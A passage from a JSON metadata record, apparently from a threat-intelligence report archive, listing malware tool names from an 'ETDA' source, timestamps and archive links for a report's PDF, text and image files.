            "tools": [
                "Catelites",
                "Catelites Bot",
                "CronBot",
                "TinyZBot"
            ],
            "source_id": "ETDA",
            "reports": null
        }
    ],
    "ts_created_at": 1673535624,
    "ts_updated_at": 1743041347,
    "ts_creation_date": 1653708881,
    "ts_modification_date": 1653708881,
    "files": {
        "pdf": "https://archive.orkl.eu/98e5d391ba4a750d85b95f498f0cf381a7e86a65.pdf",
        "text": "https://archive.orkl.eu/98e5d391ba4a750d85b95f498f0cf381a7e86a65.txt",
        "img": "https://archive.orkl.eu/98e5d391ba4a750d85b95f498f0cf381a7e86a65.jpg"
    }
}